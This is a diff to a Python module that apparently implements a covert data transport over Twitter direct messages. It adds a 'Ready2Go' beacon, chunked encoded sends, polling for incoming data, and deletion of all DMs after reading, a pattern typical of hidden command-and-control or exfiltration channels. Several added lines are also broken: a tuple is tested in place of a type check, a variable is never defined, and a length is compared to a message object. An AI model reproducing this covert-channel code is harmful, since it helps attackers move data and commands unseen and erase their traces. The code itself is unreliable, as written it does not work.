@@ -39,9 +39,11 @@ def prepTransport():
 
 	# Construct the api instance
 	api = tweepy.API(auth)
+	sendData("Ready2Go")
 
 def sendData(data):
 	encoded_data = encode(data)
+	api.send_direct_message(user=USERNAME, text=len(data))
 	if len(encoded_data) > 10000:
 		dataArray = [encoded_data[i:i + 6000] for i in range(0, len(encoded_data), 6000)]
 		for chunk in dataArray:
@@ -52,15 +54,30 @@ def sendData(data):
 
 def recvData():
 	data = ""
-	for message in api.direct_messages(count=1000, full_text="true"):
-		if (message.sender_screen_name == USERNAME):
-			try:
-				data += message.text # ignore the frame size
-			except:
-				data += None
-				pass
+	dataSize = api.direct_messages(count=1, full_text="true")
+	while not (dataSize.text, int):
+		sleep(5)
+		dataSize = api.direct_messages(count=1, full_text="true")
+	# for message in api.direct_messages(count=1000, full_text="true"):
+	while (len(data) != dataSize):
+		for message in api.direct_messages(count=1000, full_text="true", since_id=dataSize.id):
+			if (message.sender_screen_name == USERNAME):
+				try:
+					data += message.text
+					bufSize += len(data)
+				except:
+					pass
 	decoded_data = decode(data)
+	deleteDirectMessages()
 	return decoded_data
+
+def deleteDirectMessages():
+	dlist = api.direct_messages()
+	if len(dlist) >= 1:
+		for d in dlist:
+			d.destroy()
+	print "DMs destroyed"
+
 
 # </transport functions>
 
